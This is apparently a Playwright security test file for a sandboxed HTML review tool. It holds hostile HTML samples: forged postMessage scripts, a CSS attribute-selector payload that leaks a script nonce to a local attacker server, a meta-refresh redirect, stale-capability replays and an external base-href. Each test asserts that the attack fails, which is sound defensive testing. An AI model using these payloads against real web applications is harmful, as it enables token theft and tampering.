import fs from "node:fs";
import http from "node:http";
import { test, expect, openReview, reviewApi, waitForSdk, writeFile } from "./helpers.js";

function listen(server) {
  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => resolve(server.address().port));
  });
}

function close(server) {
  return new Promise((resolve, reject) => server.close((err) => (err ? reject(err) : resolve())));
}

test("file scripts, handlers, and forged frame messages cannot change file or review state", async ({ page, review }) => {
  const original =
    '<!doctype html><html><body onload="parent.postMessage({type:\'eh:html\',html:\'owned\'},\'*\')">' +
    '<script>parent.postMessage({type:"eh:edit",label:"owned",after:"owned"},"*")</script>' +
    '<button onclick="parent.postMessage({type:\'eh:html\',html:\'owned\'},\'*\')">Run</button></body></html>';
  const file = writeFile(review, "hostile.html", original);
  const { key } = await openReview(page, review, file);
  const frame = await waitForSdk(page);
  expect(await frame.locator("script[data-eh-bootstrap]").count()).toBe(0);
  await frame.locator("button", { hasText: "Run" }).click();
  await page.waitForTimeout(200);

  expect(fs.readFileSync(file, "utf8")).toBe(original);
  const state = (await reviewApi(review, `/api/page/${key}`)).json();
  expect(state.comments).toEqual([]);
  expect(state.edits).toEqual([]);
});

test("the nonce capability is hidden from authored CSS before the SDK removes its tag", async ({ page, review }) => {
  const hits = [];
  const attacker = http.createServer((req, res) => {
    hits.push(req.url);
    res.writeHead(204);
    res.end();
  });
  const attackerPort = await listen(attacker);
  try {
    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    const rules = [...alphabet]
      .map(
        (char) =>
          `script[data-eh-bootstrap][nonce^="${char}"]{display:block;width:1px;height:1px;` +
          `background-image:url("http://localhost:${attackerPort}/${encodeURIComponent(char)}")}`
      )
      .join("");
    const file = writeFile(
      review,
      "nonce-css.html",
      `<!doctype html><html><head><style>${rules}</style></head><body><p>Safe</p></body></html>`
    );
    await openReview(page, review, file);
    const frame = await waitForSdk(page);
    expect(await frame.locator("script[data-eh-bootstrap]").count()).toBe(0);
    await page.waitForTimeout(200);
    expect(hits).toEqual([]);
  } finally {
    await close(attacker);
  }
});

test("meta refresh attacker and malformed raw-text markup cannot replace the channel", async ({ page, review }) => {
  const attacker = http.createServer((_req, res) => {
    res.writeHead(200, { "content-type": "text/html" });
    res.end(
      '<script>for(const type of ["eh:ready","eh:html","eh:edit","eh:asset","eh:navigate"])' +
      'parent.postMessage({type,html:"owned",href:"https://example.com"},"*")</script>'
    );
  });
  const attackerPort = await listen(attacker);
  try {
    const original =
      `<!doctype html><meta http-equiv="refresh" content="0;url=http://localhost:${attackerPort}/">` +
      "<textarea>unterminated hostile raw text";
    const file = writeFile(review, "refresh.html", original);
    const { key } = await openReview(page, review, file);
    await page.waitForTimeout(500);
    expect(fs.readFileSync(file, "utf8")).toBe(original);
    const state = (await reviewApi(review, `/api/page/${key}`)).json();
    expect(state.comments).toEqual([]);
    expect(state.edits).toEqual([]);
  } finally {
    await close(attacker);
  }

  const malformed = writeFile(review, "malformed.html", "<!doctype html><textarea>never closed");
  await openReview(page, review, malformed);
  await waitForSdk(page);
});

test("consumed registrations and stale capabilities cannot replay after reload or navigation", async ({ page, review }) => {
  const first = writeFile(
    review,
    "first.html",
    '<!doctype html><html><body><a id="next" href="./second.html">Next</a><p>First</p></body></html>'
  );
  const second = writeFile(review, "second.html", "<!doctype html><html><body><p>Second</p></body></html>");
  const registrations = [];
  page.on("response", async (response) => {
    if (/\/api\/session\/\w+\/render$/.test(response.url()) && response.ok()) {
      registrations.push(await response.json());
    }
  });

  await openReview(page, review, first);
  await waitForSdk(page);
  await expect.poll(() => registrations.length).toBeGreaterThan(0);
  const initial = registrations[0];
  const replay = await fetch(`http://127.0.0.1:${review.port}${initial.path}`);
  expect(replay.status).toBe(410);

  await page.route("**/api/session/*/navigate", async (route) => {
    await new Promise((resolve) => setTimeout(resolve, 700));
    await route.continue();
  }, { times: 1 });
  await page.frameLocator("#frame").locator("#next").evaluate((link) => {
    link.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, ctrlKey: true }));
  });
  fs.writeFileSync(
    first,
    '<!doctype html><html><body><a id="next" href="./second.html">Next</a><p>Reloaded while navigating</p></body></html>'
  );
  await expect(page).toHaveTitle("second.html");
  await waitForSdk(page);
  await expect.poll(() => registrations.length).toBeGreaterThan(2);
  const currentFrame = page.frames().find((candidate) => /\/artifact\/r_/.test(candidate.url()));
  await currentFrame.evaluate((stale) => {
    parent.postMessage(
      {
        type: "eh:html",
        html: "<!doctype html><title>owned</title>",
        capability: stale.capability,
        generation: stale.generation,
        pageKey: stale.pageKey,
      },
      "*"
    );
  }, initial);
  await page.waitForTimeout(200);
  expect(fs.readFileSync(second, "utf8")).toContain("<p>Second</p>");

  const beforeReload = registrations.at(-1);
  const registrationCount = registrations.length;
  await currentFrame.evaluate(() => location.reload());
  await expect.poll(() => registrations.length).toBeGreaterThan(registrationCount);
  const reloadedFrame = page.frames().find((candidate) => /\/artifact\/r_/.test(candidate.url()));
  await reloadedFrame.evaluate((stale) => {
    parent.postMessage(
      {
        type: "eh:html",
        html: "<!doctype html><title>owned again</title>",
        capability: stale.capability,
        generation: stale.generation,
        pageKey: stale.pageKey,
      },
      "*"
    );
  }, beforeReload);
  await page.waitForTimeout(200);
  expect(fs.readFileSync(second, "utf8")).toContain("<p>Second</p>");
});

test("a failed controlled navigation leaves the current frame connected", async ({ page, review }) => {
  writeFile(review, "second.html", "<!doctype html><p>Second page</p>");
  const file = writeFile(
    review,
    "failed-navigation.html",
    '<!doctype html><a id="missing" href="./missing.html">Missing</a>' +
      '<a id="valid" href="./second.html">Valid</a><p id="copy">Original</p>'
  );
  await openReview(page, review, file);
  const frame = await waitForSdk(page);
  await frame.locator("#missing").evaluate((link) => {
    link.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, ctrlKey: true }));
  });
  await page.waitForTimeout(200);
  await frame.locator("#valid").evaluate((link) => {
    link.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, ctrlKey: true }));
  });
  await waitForSdk(page);
  await expect(page).toHaveTitle("second.html");
});

test("same-artifact bases resolve assets while external bases are ignored", async ({ page, review }) => {
  writeFile(review, "assets/pixel.svg", '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"></svg>');
  const localBase = writeFile(
    review,
    "base.html",
    '<!doctype html><base href="./assets/"><img id="pixel" src="pixel.svg"><p>Local base</p>'
  );
  await openReview(page, review, localBase);
  const local = await waitForSdk(page);
  await expect(local.locator("#pixel")).toHaveJSProperty("complete", true);
  expect(await local.locator("#pixel").evaluate((img) => img.currentSrc)).toMatch(/\/artifact\/r_[a-f0-9]+\/assets\/pixel\.svg$/);

  const externalBase = writeFile(
    review,
    "external-base.html",
    '<!doctype html><base href="https://example.com/attacker/"><img id="relative" src="missing.png">'
  );
  await openReview(page, review, externalBase);
  const external = await waitForSdk(page);
  expect(await external.locator("html").evaluate(() => document.baseURI)).toMatch(
    /^http:\/\/localhost:\d+\/artifact\/r_[a-f0-9]+\/index\.html$/
  );
});

test("sandbox effects differ for files and localhost applications", async ({ page, review }) => {
  const app = http.createServer((req, res) => {
    if (req.url === "/download") {
      res.writeHead(200, {
        "content-type": "text/plain",
        "content-disposition": 'attachment; filename="review-download.txt"',
      });
      return res.end("download");
    }
    res.writeHead(200, { "content-type": "text/html" });
    res.end("<!doctype html><p>app</p>");
  });
  const appPort = await listen(app);
  try {
    let downloads = 0;
    page.on("download", () => {
      downloads += 1;
    });
    const downloadUrl = `http://localhost:${appPort}/download`;

    const file = writeFile(review, "sandbox.html", "<!doctype html><p>file</p>");
    await openReview(page, review, file);
    await waitForSdk(page);
    const fileFrame = page.frames().find((candidate) => /\/artifact\/r_/.test(candidate.url()));
    expect(await fileFrame.evaluate(() => window.open("about:blank") !== null)).toBe(false);
    expect(await fileFrame.evaluate((url) => window.open(url) !== null, downloadUrl)).toBe(false);
    await page.waitForTimeout(400);
    expect(downloads).toBe(0);

    await openReview(page, review, `http://localhost:${appPort}/`);
    await waitForSdk(page);
    const appFrame = page.frames().find((candidate) => candidate.parentFrame() === page.mainFrame());
    const popupPromise = page.waitForEvent("popup");
    expect(await appFrame.evaluate(() => window.open("about:blank") !== null)).toBe(true);
    const popup = await popupPromise;
    await popup.close();
    const downloadPromise = page.waitForEvent("download");
    expect(await appFrame.evaluate((url) => window.open(url) !== null, downloadUrl)).toBe(true);
    const download = await downloadPromise;
    expect(download.suggestedFilename()).toBe("review-download.txt");
    expect(downloads).toBe(1);
    await expect(page.locator("#frame")).toHaveAttribute("sandbox", /allow-popups/);
    await expect(page.locator("#frame")).toHaveAttribute("sandbox", /allow-downloads/);
  } finally {
    await close(app);
  }
});
